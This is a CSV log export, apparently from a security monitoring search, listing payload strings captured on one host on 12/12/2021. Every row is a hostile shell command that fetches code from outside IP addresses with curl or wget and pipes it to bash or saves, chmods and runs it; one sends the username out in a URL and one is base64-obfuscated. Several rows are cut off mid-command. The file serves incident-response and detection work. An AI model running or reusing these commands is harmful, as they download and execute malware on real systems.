host,earliest,payload
dch1734pl5splnk,12/12/2021 00:37:37,(curl -s 45.155.205.233:5874/198.190.230.92:443||wget -q -O- 45.155.205.233:5874/198.190.230.92:443)|bash
dch1734pl5splnk,12/12/2021 00:55:44,(curl -s 45.155.205.233:5874/161.11.225.119:443||wget -q -O- 45.155.205.233:5874/161.11.225.119:443)|bash
dch1734pl5splnk,12/12/2021 00:55:46,(curl -s 45.155.205.233:5874/161.11.225.168:443||wget -q -O- 45.155.205.233:5874/161.11.225.168:443)|bash
dch1734pl5splnk,12/12/2021 00:55:47,(curl -s 45.155.205.233:5874/161.11.225.98:443||wget -q -O- 45.155.205.233:5874/161.11.225.98:443)|bash
dch1734pl5splnk,12/12/2021 00:55:49,(curl -s 45.155.205.233:5874/161.11.225.97:443||wget -q -O- 45.155.205.233:5874/161.11.225.97:443)|bash
dch1734pl5splnk,12/12/2021 01:03:08,(curl -s 45.155.205.233:5874/161.11.225.170:443||wget -q -O- 45.155.205.233:5874/161.11.225.170:443)|bash
dch1734pl5splnk,12/12/2021 01:12:25,(curl -s 45.155.205.233:5874/161.11.143.6:443||wget -q -O- 45.155.205.233:5874/161.11.143.6:443)|bash
dch1734pl5splnk,12/12/2021 01:12:47,(curl -s 45.155.205.233:5874/161.11.143.3:443||wget -q -O- 45.155.205.233:5874/161.11.143.3:443)|bash
dch1734pl5splnk,12/12/2021 08:52:55,(wget -O - http://185.250.148.157:8005/acc||curl -o - http://185.2
dch1734pl5splnk,12/12/2021 08:52:55,(wget -O - http://185.250.148.157:8005/acc||curl -o - http://185.250.148.157:8005/acc)|/bin/bash 
dch1734pl5splnk,12/12/2021 08:53:20,(wget -O - http://185.250.148.157:8005/acc
dch1734pl5splnk,12/12/2021 08:53:24,(wget -O - http://185.250.148.157:8005/acc||curl -o - http:/
dch1734pl5splnk,12/12/2021 15:41:54,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12"
dch1734pl5splnk,12/12/2021 15:41:54,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami))
"
dch1734pl5splnk,12/12/2021 15:50:27,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var"
dch1734pl5splnk,12/12/2021 15:50:57,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tm"
dch1734pl5splnk,12/12/2021 21:05:13,"bash -c {echo,Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE1NS45NC4xNTQuMTcwL2FhYTtjdXJsIC1PIGh0dHA6Ly8x"
